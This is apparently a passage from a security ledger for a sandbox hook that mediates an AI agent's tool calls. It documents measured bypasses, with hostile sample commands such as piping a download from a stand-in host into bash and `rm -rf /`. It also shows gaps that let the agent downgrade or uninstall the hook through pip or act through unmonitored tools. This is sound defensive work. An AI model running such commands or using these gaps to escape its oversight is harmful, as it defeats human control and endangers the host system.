...
| C-71 | A program name is compared the way the OS resolves it | HARD | PROVEN |
...
**⚠ MEASURED 2026-07-28 — the claim does not hold uniformly across capability kinds.** The
interception is five monkeypatches (`builtins.open`, `os.system`, `socket.socket`,
`socket.create_connection`, `subprocess.Popen`). Probed with ordinary, idiomatic stdlib calls —
no adversarial code, no `ctypes` — against a constitution granting nothing outside a sandbox:

| kind | routed through the membrane | NOT routed |
|---|---|---|
| NETWORK | `socket.socket`, `socket.create_connection`, `http.client`, `urllib.request.urlopen` | `socket.getaddrinfo` (O-31) |
| SUBPROCESS | `subprocess.Popen`, `subprocess.run`, `os.system`, `os.popen` | `os.spawnv` and the `os.exec*` family (O-32) |
| FILESYSTEM | `builtins.open`, `shutil.copy`, `shutil.copyfile` | `io.open`, `pathlib.Path.write_text`, `os.open`+`os.write`, `os.rename` (O-30) |

Four of eight filesystem probes wrote a file outside the constitution. **The reason is structural,
not an oversight:** Python funnels all networking through `socket` and nearly all process creation
through `Popen`, so two patches cover those surfaces — but it has *no* chokepoint for filesystem
writes, since `io.open`, `os.open`, `os.rename` and `os.replace` are independent syscall wrappers.
Where the language has a chokepoint the approach works; where it has none it cannot. So the claim
stands for NETWORK and SUBPROCESS on ordinary code, and does **not** stand for FILESYSTEM.
**Why the proof did not catch it:** every write in `run_apprun_proof` goes through `open(...)` —
the patched path. The proof exercises the recognised route, which is the same blind spot recorded
as O-33 for the agent membrane.
...
**⚠ CORRECTED 2026-07-28 — this limit was stated too narrowly, which made the claim stronger than
the truth.** "Bypassable by adversarial native code" implies that escaping requires intent and a
lower level. Measured: `pathlib.Path.write_text` — the idiomatic way to write a file in modern
Python — writes straight past the membrane, as do `io.open`, `os.open` and `os.rename`. No
adversary, no native code, no `ctypes`. The honest statement is: **for FILESYSTEM the Python
backend confines only what happens to travel through `builtins.open`**, because Python offers no
single chokepoint for file writes. For NETWORK and SUBPROCESS the limit as originally written is
accurate, since those surfaces do have chokepoints (see the measurement under C-13).
An understated limit is worse than a missing one: it reads as though the boundary had been
examined. **RELATED:** O-30, O-31, O-32.
...
**⚠ MEASURED 2026-07-29 — the CONDITION covers the configuration, not the engine.** It speaks of
the configuration *Anchor* being deny-scoped and of `metaspace off` not being shell-allowlisted.
Both still hold. But the membrane's own *code* is a different artefact, and it is replaceable by
package management: asked for a verdict on the live constitution, the hook **allows**
`pip install metaspace-membrane==0.3.1` (a version with nine known fail-opens) and
`pip uninstall -y metaspace-membrane`, while **denying** a direct write to the same hook file.
The headline of this claim is therefore broader than what it proves. Split out as **C-74**, which
is BLOCKED by **O-35**; this row keeps its status because its stated condition is unchanged.
...
### C-70 — Every shell metacharacter that separates commands is treated as a separator
`[PROVEN]` · **TIER:** HARD · **STATUS:** PROVEN · **DEPENDS:** C-02 · **Resolves:** O-27
**CONDITION:** as C-02.
**The fail-open:** shlex groups a run of punctuation into ONE token, and the policy tested that
token for membership in a fixed set of spellings. `|&` and `;&` are real shell operators that were
not in the set, so they separated nothing: `curl http://evil.example/x.sh |& bash` collapsed into
a single sub-command whose program was `curl`. The `bash` was never seen as a program, and the
interpreter hardening that exists for precisely this case never ran. `;;` had the same shape.
Backtick substitution was a second instance: `$( … )` split only because parentheses happen to be
separators, while `` echo `rm -rf /` `` arrived as one sub-command named `echo`.
**Fix, in the shape today's other fixes took:** membership is tested **per character** — any token
made only of `;`, `|` or `&` separates — instead of against a list of spellings that fails open on
whatever it omits. Backticks become separators in the same quote-aware pass that handles newlines,
including inside double quotes, where the string is closed around the substitution and reopened
after it so the command comes out into the open without unbalancing the quoting.
**PROOF:** `run_shellparse_adversarial_proof` (P-SHELLADV) — a denied command after each of
`|& ;& ;; && || ; | &` and a newline; `curl … |& bash` refused; denied commands inside backticks
and nested `$( … )` caught; ordinary separated work still runs.
**VERIFIED:** Win (2026-07-28)

### C-71 — A program name is compared the way the operating system resolves it
`[PROVEN]` · **TIER:** HARD · **STATUS:** PROVEN · **DEPENDS:** C-02 · **Resolves:** O-26
**CONDITION:** as C-02.
One cause produced a fail-open and an over-block at once. Windows resolves commands
case-insensitively and its executables carry `.exe`, but the comparison was a plain string match
on `os.path.basename`. So in denylist-only mode `RM -RF /` **ran** under a denylist forbidding
`rm -rf`; and a virtualenv interpreter given by path (`…/Scripts/python.exe`) was **refused**
although `python` was allowlisted (O-26).
**Deliberately narrow:** only `.exe` is stripped, and case is folded only on Windows. A `.bat` or
`.cmd` is a script, not the same artefact as the bare name, and letting it inherit an allowlist
entry meant for a binary would be a hole rather than a convenience. Off Windows, case stays
significant, because there `RM` genuinely is not `rm`.
**PROOF:** `run_shellparse_adversarial_proof` (P-SHELLADV) — OS-aware legs on both sides,
including that `.exe` does not smuggle a non-allowlisted program in and that a name merely
containing an allowlisted one is still refused.
**VERIFIED:** Win (2026-07-28)

### C-72 — A DENY that is written is a DENY that is enforced
`[PROVEN]` · **TIER:** N/A · **STATUS:** PROVEN · **Resolves:** O-28
Two ways a written denial was silently absent. **Quoting:** the parser accepted only double
quotes, so `DENY 'git push'` was dropped without a word — the author believed it enforced. Both
styles are now read, in `ALLOW` too. **Placement:** matching was an exact token *prefix*, so
`git -C /tmp/repo push` walked past `git push` by putting an option in between. The denied
program must now be the sub-command's program, and the remaining words must appear **in order**
among its arguments.
**ACCEPTED OVER-BLOCK, stated rather than discovered later:** `git commit -m push` now matches
`git push`, because after quote removal the message is the token `push`. Refusing too much is
loud and correctable; refusing too little is what O-25 was.
**SCOPE-LIMIT, unchanged:** a denylist is still defence-in-depth (C-63). `rm -r -f /` continues to
evade an entry written `rm -rf`, and no amount of matching fixes that — the boundary is the
filesystem and network scope, not this list. What is fixed is narrower and more important: a rule
the author wrote must not be silently missing.
**PROOF:** `run_shellparse_adversarial_proof` (P-SHELLADV) — single-quoted `ALLOW`/`DENY` parsed;
`git -C … push` and `git --no-pager push` refused; and three false-positive guards: a denied
string as a quoted argument, an option merely containing the word, and the plain program.
**VERIFIED:** Win (2026-07-28)

### C-73 — Every tool that hands a command line to a shell is decided by the same core
`[PROVEN]` · **TIER:** HARD · **STATUS:** PROVEN · **DEPENDS:** C-02, C-38 · **Resolves:** O-34
**CONDITION:** as C-02 — and, additionally, that the host routes the tool to the hook. That is the
part this claim can only assert for the tool names now listed; the general case is O-33.
**What it fixes:** the Bash path is the most defended surface in this project — nine fail-opens
closed in one day, guarded by fifty proofs. Beside it sat a `PowerShell` tool with the same
capability on the same machine, and the membrane did not know it existed. Measured 2026-07-28: a
live PowerShell call produced NO audit entry at all, not even `PASSTHROUGH`, because the installer
writes an enumerated matcher and that name was not on it. Every shell protection was one tool name
away from irrelevant. Both shells now map to `SHELL/exec` and reach identical verdicts.
**HONEST LIMIT — mediation, not comprehension:** `core/shell_policy.py` tokenises POSIX-style, and
PowerShell is not POSIX (its backtick escapes rather than substitutes). The mismatch runs towards
over-blocking, which is the safe direction, but the boundary on this host stays the FILESYSTEM
write-scope and the NETWORK out-scope, exactly as C-63 says for interpreters in general.
**AND IT IS A STOPGAP.** Adding names to a set is the enumeration this project keeps having to
undo. It closes the one gap that was measured to be severe; it does not make the membrane
deny-by-default over tools it has not been told about. That remains O-33.
**PROOF:** `run_powershell_proof` (P-POWERSHELL) — a PowerShell event is decided rather than
passed through; deny-by-default applies; both shells agree on every probe; the installer's matcher
names it.
**VERIFIED:** Win (2026-07-28)

### C-74 — A deceived agent cannot replace or remove the membrane's own code
`[PROVEN]`-shaped but **STATUS:** BLOCKED · **TIER:** HARD · **RELATED:** C-33 · **BLOCKED-BY:** O-35
**CONDITION (what would have to hold, none of which does today):** the engine's files are outside
every write scope the agent holds **and** unreachable through any allowlisted interpreter running
as a subprocess — or, failing that, the hook verifies its own integrity before each decision
against a value the agent cannot write. Stating the condition is what makes clear that the claim
is not merely unproven but currently false on a normal installation.
C-33 protects the membrane's *configuration*: the Anchor is deny-scoped and `metaspace off` is not
shell-allowlisted. Its code is a separate artefact and is not protected at all. Measured on the
live installation 2026-07-29: a direct write to the hook file is **denied**, while
`pip install metaspace-membrane==0.3.1` and `pip uninstall -y metaspace-membrane` are **allowed** —
the first silently swapping the engine for one with nine known fail-opens, the second removing it.
**Why it is hard rather than an oversight:** the membrane mediates *tool calls*, and a package
manager is an allowlisted interpreter doing ordinary work inside a process it started (C-07, C-63).
Denying `pip` by name would be a denylist, which this project has spent three days demonstrating
is not a boundary. Moving the engine outside the agent's write scope — done deliberately as I-54 —
defends it from the Write tool and not from `pip`, because the write happens in a subprocess.
**Acceptance:** a route by which replacing or removing the engine is refused, or detected before
the next decision is trusted — for example an integrity check the hook performs on itself against
a value the agent cannot write. Until then, the honest statement is that the membrane's
...
| **O-37** | **OPEN LINE OF INQUIRY, not yet a decision — the enforcement point may belong below the process tree rather than at the tool call.** Recorded so tomorrow starts from here instead of re-deriving it. The argument: the constitution governs EFFECTS, and the project's founding constraint is that every rule must be decidable by a Turing-incomplete algorithm. "What will this command do?" is not — shell expansion alone is Turing-complete — so the shell policy is a computation outside the class the thesis permits, which is why it produced eleven fail-opens in two days. The alternative is not to analyse the command but never to ask: decide at the moment of the TOUCH, where the input is a concrete path or host and the policy is a finite list. Substrate rules (Landlock, seccomp) are **inherited across fork/exec and cannot be dropped**, so one ruleset derived from the `.bio` would bound every process the agent starts, with no parsing, no allowlist and no tool-name recognition — which would also dissolve O-33 (an unrouted tool cannot escape a ruleset it inherits) and O-35 (`pip` cannot overwrite an engine directory that is not writable). **Three conditions, all necessary; today's failures split cleanly between them:** (1) DECIDABILITY — the decision is Turing-incomplete; the shell parser fails this. (2) NAMEABILITY — some chokepoint sees the protected resource as concrete data; a database ROW fails this at the OS layer, where only a socket is visible, though a database FILE passes. (3) UNBYPASSABILITY — no path around the chokepoint; the in-process monkeypatch fails this, and so does an unrouted tool. **What must be checked before any of it is acted on:** the UI currently tells users that confinement includes "blocked dangerous commands" under deny-by-default (`ui_server.py:424`), C-03 (Friendly Fire) rests on the shell allowlist and is the only such protection on Windows today, and five HARD claims (C-62, C-69, C-70, C-71, C-73) are about the parser and would need re-tiering. **Deleting the shell layer would remove live protection on Windows in exchange for a Linux-only promise** — so the likely shape is a direction change, not a removal. | reasoning + the measurements recorded in O-20…O-36 | OPEN | — |
| **O-36** | **A fix that changes the ROUTING does not reach existing installations through `pip install -U`.** The matcher — which decides whether a tool call is shown to the membrane at all — is written into the user's `settings.json` at install time, and lives there afterwards. Upgrading the package replaces the code and leaves the routing untouched. Measured 2026-07-29 immediately after upgrading this machine to 0.3.5: the installed `install.py` would write a matcher naming `PowerShell`, the settings file still named the old seven, and a live PowerShell call still produced **no audit entry at all**. So the release that exists to close O-34 does not close it for anyone who had already installed — while its notes say the gap is fixed. **This is not specific to PowerShell:** every future change to what gets routed has the same problem, which makes it a property of the upgrade path rather than of one release. Plausible directions: `metaspace install` becoming idempotent-and-expected after every upgrade (documented, and checked by a proof); the hook detecting at runtime that its own matcher is older than the code and saying so; or moving routing out of the user's file entirely, which is where `matcher: "*"` (O-33) would also lead. | **empirical run** (upgrade, then a live call with no trace) | OPEN | — |
| **O-35** | **The membrane's own CODE can be replaced or removed by the agent, although its configuration cannot.** Measured on the live installation 2026-07-29, asking the hook for a verdict without executing anything: a direct write to the hook file is **denied**, while `pip install metaspace-membrane==0.3.1` — a version carrying nine known fail-opens — and `pip uninstall -y metaspace-membrane` are both **allowed**. The downgrade is the worse of the two, because afterwards the hook still runs and still reports verdicts; nothing looks wrong. **The cause is the documented C-07 boundary applied to the membrane itself:** it mediates tool calls, and a package manager is an allowlisted interpreter doing ordinary work inside a process it started. Moving the engine outside the agent's write scope (I-54) defends it from the Write tool and not from `pip`. **Denying `pip` by name would be a denylist**, which this project has spent three days showing is not a boundary — `python -m pip`, `py -m pip`, a vendored wheel and a dozen other spellings remain. Plausible directions: an integrity check the hook performs on itself against a value the agent cannot write; OS-level protection of the install directory; or accepting it as a stated limit. Blocks **C-74**; qualifies the headline of C-33, whose stated CONDITION is about configuration and remains satisfied. | **empirical run** (verdict only, nothing executed) | OPEN | C-74 |
| **O-34** | **A second shell on the same host was entirely unmediated.** A `PowerShell` tool sat beside `Bash` with the same capability, and the membrane did not know it existed: a live call produced no audit entry at all, not even PASSTHROUGH. Every shell protection built in this project — structural tokenisation, allowlist, denylist, interpreter hardening, and the nine fail-opens closed on 2026-07-28 — was one tool name away from irrelevant. **RESOLVED by C-73:** both shells map to `SHELL/exec` and reach identical verdicts, and the installer's matcher names it. **The resolution is a stopgap, and is recorded as one:** it closes the gap that was measured to be severe and does not make the membrane deny-by-default over tools it was never told about (O-33). Note also that the policy tokenises POSIX-style, so this is mediation rather than comprehension of PowerShell. | **empirical run** (no audit trace) | RESOLVED | — |
| **O-33** | **The membrane is deny-by-default only over the effects it can NAME; everything it fails to recognise is allowed by omission.** Three recognition gates run before any decision, and each one fails open. (1) **Routing** — the installer writes an enumerated matcher (`Write, Edit, MultiEdit, NotebookEdit, Read, Bash, WebFetch`, `install.py:56` and `cli.py:371`). Measured 2026-07-28: a **PowerShell** tool call produced no audit entry at all — not ALLOW, not DENY, not PASSTHROUGH. The hook was never invoked. Every `metaspace install` ships this. (2) **Mapping** — a tool the hook cannot map to `(kind, mode, target)` is recorded as `PASSTHROUGH`, whose meaning is literally *"I did not understand this, so I allowed it"*. In a faithful deny-by-default membrane that category cannot exist: there is ALLOW for what is granted, and DENY for everything else INCLUDING what is not understood. (3) **Interpretation** — for SHELL the decision rests on parsing an open-world language, which produced nine fail-opens in one day. **This is the same root cause already written down twice and never generalised:** O-4 says MCP tool vocabularies are open-world and cannot be soundly mapped; O-8 says the `apprun` monkeypatch set is the part that does not generalise. Same defect, three products. The contrast that names it: in the WASM membrane an ungranted capability is a **link error** — the guest cannot even express the effect — whereas the hook reviews an agent that already holds full ambient authority. **Enumerated recognition instead of removed authority.** The proofs did not catch it because every one of them feeds the hook an effect it already recognises. Blocks nothing formally, and undermines the CONDITION of C-02 ("the host routes *every* tool effect through the hook"), which our own installer does not satisfy. **THE SURFACE, MEASURED 2026-07-28.** Audit history: 7652 entries, produced by exactly **five** tool names (`Bash` 1795, `Edit` 1351, `Write` 390, `Read` 146, `WebFetch` 32), plus three PASSTHROUGH names from Cursor. Two of the seven names in the matcher (`MultiEdit`, `NotebookEdit`) have never appeared at all. Against that, the tool inventory actually reachable in one live session is about **73 names** (14 direct, 23 deferred, 6 auth, 30 MCP) — so the matcher routes roughly **one name in ten**. Effect-capable examples that were unmediated: `PowerShell` (arbitrary execution — now closed as O-34), `Artifact` (publishes content to the web), 27 `mcp__alpaca__*` tools (network and account data), `WebSearch`, `Glob`/`Grep`/`LSP` (filesystem read), `EnterWorktree`/`ExitWorktree` (filesystem writes via git), `Agent`/`Skill`, and `SendMessage`/`PushNotification`/`RemoteTrigger`/`Cron*` (external or scheduled effects). Confirmed live: `Glob`, `Grep` and `PowerShell` calls left no trace of any kind. **The number to hold on to is not 10%** — it is that the project cannot say what the other 66 names do, which is the definition of an unmeasured attack surface. | **empirical run** (a PowerShell call left no audit trace) + code | OPEN | — |
| **O-32** | **The `os.spawn*` and `os.exec*` family is not mediated.** `subprocess.Popen` is patched and `subprocess.run`, `os.system` and `os.popen` all reach it, so ordinary process creation is contained — but `os.spawnv` creates a process without touching `Popen`, and the `os.exec*` family replaces the current one. Measured 2026-07-28 against a constitution granting no SUBPROCESS at all: `os.spawnv` ran. Narrow and closable, unlike O-30: process creation in Python has few entry points, so this is a list that can actually be completed. | **empirical run** | OPEN | — |
| **O-31** | **Name resolution is not mediated.** `socket.getaddrinfo` is not patched, so a program under the Python membrane can resolve arbitrary names although the constitution grants no NETWORK. No payload travels over a resolver, but the query itself leaves the machine and carries whatever the caller puts in the name — the standard DNS side channel. Measured 2026-07-28. Minor next to O-30 and recorded so it is not rediscovered as new. | **empirical run** | OPEN | — |
| **O-30** | **Python has no chokepoint for filesystem writes, so the language-level membrane cannot confine them.** The interception patches `builtins.open`; `io.open`, `pathlib.Path.write_text`, `os.open` + `os.write` and `os.rename` are independent syscall wrappers and reach the disk untouched. Measured 2026-07-28 with ordinary stdlib calls — no adversarial code, no `ctypes`: four of eight probes wrote a file outside the constitution, one of them `pathlib`, which is how modern Python writes files. **Not fixable by lengthening the patch list in any satisfying way** — that is the enumeration trap this project keeps meeting, and here the language offers no alternative: unlike NETWORK (everything funnels through `socket`) and SUBPROCESS (nearly everything through `Popen`), file writes have many independent entry points. Extending the list is still worth doing as defence-in-depth, but the honest containment answer for FILESYSTEM is the substrate (C-40, Landlock/seccomp), not the interpreter. Forces the correction recorded on C-13 and C-15. | **empirical run** | OPEN | C-40 |
| **O-29** | **Shell KEYWORDS are treated as program names.** `for`, `do`, `then`, `done`, `fi`, `esac`, `in` and friends are grammar, not executables, but the allowlist reads the first token of each sub-command as a program — so `for p in a b; do …; done` is refused for invoking a program called `for`. Measured live 2026-07-28 while running the very proofs for C-70…C-72; `do`, `for` and `then` had also appeared in the earlier dry-run audit. Over-blocking, so the direction is safe, and the pressure it creates is the familiar one: add `for` and `do` to the allowlist and it stops meaning "programs". **Deliberately NOT fixed in the same pass**, because the fix is shell grammar rather than a lookup, and the two halves behave differently: `if`, `elif`, `then`, `else`, `do`, `while`, `until` are followed by a COMMAND, which must still be checked (`if rm -rf /; then` must stay refused), whereas `for`, `select`, `case`, `in` are followed by a word list that is not an invocation at all. Getting that backwards would hide a command behind a keyword — exactly the shape of O-25. Wants its own claim and its own falsifiable legs, not a quick lookup table appended to a long session. | **empirical run** (blocked live) + code | OPEN | — |
| **O-28** | **A written DENY could be silently absent.** Two independent causes. (a) The parser accepted only double quotes, so `DENY 'git push'` was dropped with no error and no enforcement — the author believing otherwise. (b) Matching was an exact token PREFIX, so `git -C /tmp/repo push` slipped past `git push` by placing an option in between. Both measured 2026-07-28. This is the O-20 family in a second file: the rule reads as written, the membrane enforces something weaker, and nothing says so. **RESOLVED by C-72:** both quoting styles are parsed, and the denied words must appear in order among the sub-command's arguments rather than as a prefix. The accepted over-block (`git commit -m push`) is stated on the claim. | **empirical run** + code | RESOLVED | — |
| **O-27** | **A metacharacter absent from the separator list separated nothing — a fail-OPEN.** shlex groups a punctuation run into ONE token and the policy tested that token against a fixed set of spellings; the pipe-with-stderr operator and the case-fallthrough operator were not in it, so a `curl` piped that way into `bash` became a single sub-command named `curl` and the `bash` was never checked, bypassing the interpreter hardening entirely. Backticks were the same defect wearing different clothes: `$( … )` split only because parentheses happen to be separators, while `` echo `rm -rf /` `` did not split at all. Measured 2026-07-28. **RESOLVED by C-70:** separator membership is tested per character, and backticks are expanded in the same quote-aware pass as newlines — including inside double quotes, where the string is closed around the substitution and reopened after it. | **empirical run** + code | RESOLVED | — |
| **O-26** | **On Windows an explicit interpreter path is refused: `python.exe` is not `python`.** The allowlist compares `os.path.basename(argv[0])`, so `C:/…/Scripts/python.exe` yields `python.exe`, which no sane constitution lists — while `python` is listed and means the same program. Measured live 2026-07-28 while verifying the 0.3.3 release: running a venv's interpreter by path was refused. It had also appeared twice in the earlier dry-run audit. This is over-blocking, so the direction is safe, but it is reachable in entirely ordinary use — any venv, any absolute interpreter path — and the pressure it creates is to hand-add `.exe` spellings, which doubles every entry and invites someone to add the wrong one. The fix is to strip a trailing `.exe` when comparing on Windows; `.bat`/`.cmd` deliberately NOT included, since a script of that name is not the same artefact as the bare name. Recorded rather than fixed on the day of a release: 0.3.3 had just shipped and an unforced parser change is exactly what a freshly released package should not receive. **RESOLVED by C-71**, in the adversarial pass that followed, together with the case-folding fail-open it shared a cause with. | **empirical run** (blocked live) + code | RESOLVED | — |
...
| **O-39** | **`git stash push <path>` is refused by the `DENY "git push"` rule.** Measured live 2026-09-12 while reverting a file to demonstrate that a proof can fail: `git stash push products/ai_membrane/session_guard_hook.py` produced `denied invocation: git push`. This is a *consequence* of C-72, not a defect in it — since C-72 the denied words must appear **in order** among a sub-command's arguments rather than as a prefix, which is precisely what closed the hole where `git -C /tmp/repo push` slipped through. An interposed `stash` therefore does not help, and neither would any word between `git` and `push`. **Over-blocking, so the direction is safe**, and it blocks no claim — but it is reachable in entirely ordinary use (`git stash push -- <path>` is the modern spelling), which puts it in the O-26 / O-29 family. **The pressure it creates is the dangerous part:** the obvious fix is to loosen how the denylist matches, and loosening it is what would reopen O-28. A safe fix has to distinguish `push` as a *subcommand* from `push` as an argument to a different subcommand — i.e. shell grammar plus a little git grammar, not a looser lookup table. Recorded rather than fixed, for the same reason O-29 was: that is its own claim with its own falsifiable legs. Workaround meanwhile: `git stash -- <path>`, or copy the file aside and `git checkout --`. | **empirical run** (blocked live) | OPEN | — |
